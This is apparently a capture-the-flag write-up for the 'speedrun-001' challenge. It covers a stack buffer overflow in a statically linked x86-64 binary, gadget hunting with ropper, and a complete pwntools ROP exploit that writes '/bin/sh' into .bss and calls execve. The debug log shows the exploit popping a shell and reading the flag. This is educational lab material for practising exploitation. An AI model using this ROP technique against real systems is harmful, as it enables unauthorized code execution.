# &#35; speedrun-001

#### &#42; execute
```bash
## 1 file
$ ls
speedrun-001

$ file ./speedrun-001
./speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped

$ checksec --file=./speedrun-001
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		0	./speedrun-001


## just echo
$ ./speedrun-001
Hello brave new challenger
Any last words?
AAAAAAAAAAAAA
This will be the last thing that you say: AAAAAAAAAAAAA

Alas, you had no luck today.

```

#### &#42; debugging
```bash
## can overflow buf[1024]
void FUN_00400b60(void)

{
  undefined buf [1024];
  
  puts("Any last words?");
  FUN_004498a0(0,buf,2000);
  printf("This will be the last thing that you say: %s\n",buf);
  return;
}

```

#### &#42; structure of stack
```bash
buf[1024] + rbp[8] + ret[8]

```

#### &#42; payload(python)
```bash
payload  = "A"*1024
payload += "B"*8
payload += "C"*8

```

#### &#42; check payload(python)
```bash
$ ulimit -c unlimited
$ (python -c 'print "A"*1024+"B"*8+"C"*8')|./speedrun-001
$ ls core
core
$ gdb -core ./core -q
gef➤  i r $rbp $rip
rbp            0x4242424242424242  0x4242424242424242
rip            0x400bad            0x400bad
gef➤

```

#### &#42; analysis binary using gdb
```bash
## binary not have useful function address => have to use rop
gdb ./speedrun-001 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./speedrun-001...
(No debugging symbols found in ./speedrun-001)
gef➤  p puts
No symbol table is loaded.  Use the "file" command.
gef➤  p gets
No symbol table is loaded.  Use the "file" command.
gef➤  p system
No symbol table is loaded.  Use the "file" command.
gef➤


## find gadgets(sys_execve("/bin/sh",0,0)
$ ldd ./speedrun-001
	not a dynamic executable

$ gdb ./speedrun-001 -q
gef➤  ropper --search "pop r?i; ret"
0x0000000000400686: pop rdi; ret;
0x00000000004101f3: pop rsi; ret;

gef➤
gef➤  ropper --search "pop r?x; ret"
0x000000000048cccb: pop rax; ret 0x22;
0x0000000000415664: pop rax; ret;
0x00000000004a9a00: pop rbx; ret 0x6f9;
0x0000000000400df8: pop rbx; ret;
0x000000000044be16: pop rdx; ret;

gef➤  ropper --search "syscall; ret"
0x0000000000474e65: syscall; ret;

gef➤

gef➤
gef➤  grep "/bin/sh"
[+] Searching '/bin/sh' in memory

## gadgets are below
0x000000000044be16: pop rdx; ret;
0x0000000000415664: pop rax; ret;
0x0000000000400686: pop rdi; ret;
0x00000000004101f3: pop rsi; ret;
0x0000000000474e65: syscall; ret;
```



#### &#42; how to attack
```bash
## binary does not have string("/bin/sh")
## thus we use .bss section like below
## read(0, bss, len("/bin/sh"))
## and send string("/bin/sh")
## execve(&bss, 0, 0)

```


#### &#42; make exploit code
```bash
from pwn import *

context.log_level='debug'

filename = './speedrun-001'
elf=ELF(filename)
conn=process(filename)

binsh='/bin/sh\x00'

bss = elf.get_section_by_name(".bss").header.sh_addr

print(".bss : "+hex(bss))

binsh='/bin/sh\x00'

'''
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x000000000044be16 : pop rdx ; ret
0x0000000000474e65: syscall; ret;
'''
pop_rax=0x0000000000415664
pop_rdi=0x0000000000400686
pop_rsi=0x00000000004101f3
pop_rdx=0x000000000044be16
syscall=0x0000000000474e65

payload  = "A"*1024 + "B"*8
# read(0, bss, len(binsh))
payload += p64(pop_rdi)
payload += p64(0x00)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(len(binsh))
payload += p64(pop_rax)
payload += p64(0x00)
payload += p64(syscall)

# execve("/bin/sh", 0, 0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(syscall)

conn.recvuntil('Any last words?\n')
conn.send(payload)
conn.send(binsh)

conn.interactive()


```


#### &#42; try to exploit
```bash
$ python exp-speedrun-001.py
[DEBUG] '/pwn/speedrun-2019/speedrun-001' is statically linked, skipping GOT/PLT symbols
[*] '/pwn/speedrun-2019/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './speedrun-001' argv=['./speedrun-001'] : pid 155
.bss : 0x6bb2e0
[DEBUG] Received 0x2b bytes:
    'Hello brave new challenger\n'
    'Any last words?\n'
[DEBUG] Sent 0x498 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000400  42 42 42 42  42 42 42 42  86 06 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000410  00 00 00 00  00 00 00 00  f3 01 41 00  00 00 00 00  │····│····│··A·│····│
    00000420  e0 b2 6b 00  00 00 00 00  16 be 44 00  00 00 00 00  │··k·│····│··D·│····│
    00000430  08 00 00 00  00 00 00 00  64 56 41 00  00 00 00 00  │····│····│dVA·│····│
    00000440  00 00 00 00  00 00 00 00  65 4e 47 00  00 00 00 00  │····│····│eNG·│····│
    00000450  64 56 41 00  00 00 00 00  3b 00 00 00  00 00 00 00  │dVA·│····│;···│····│
    00000460  86 06 40 00  00 00 00 00  e0 b2 6b 00  00 00 00 00  │··@·│····│··k·│····│
    00000470  f3 01 41 00  00 00 00 00  00 00 00 00  00 00 00 00  │··A·│····│····│····│
    00000480  16 be 44 00  00 00 00 00  00 00 00 00  00 00 00 00  │··D·│····│····│····│
    00000490  65 4e 47 00  00 00 00 00                            │eNG·│····│
    00000498
[DEBUG] Sent 0x8 bytes:
    00000000  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·│
    00000008
[*] Switching to interactive mode
[DEBUG] Received 0x436 bytes:
    00000000  54 68 69 73  20 77 69 6c  6c 20 62 65  20 74 68 65  │This│ wil│l be│ the│
    00000010  20 6c 61 73  74 20 74 68  69 6e 67 20  74 68 61 74  │ las│t th│ing │that│
    00000020  20 79 6f 75  20 73 61 79  3a 20 41 41  41 41 41 41  │ you│ say│: AA│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000420  41 41 41 41  41 41 41 41  41 41 42 42  42 42 42 42  │AAAA│AAAA│AABB│BBBB│
    00000430  42 42 86 06  40 0a                                  │BB··│@·│
    00000436
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86\x06
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x1b bytes:
    'getted flag successully!!!\n'
getted flag successully!!!
[*] Got EOF while reading in interactive
$
```
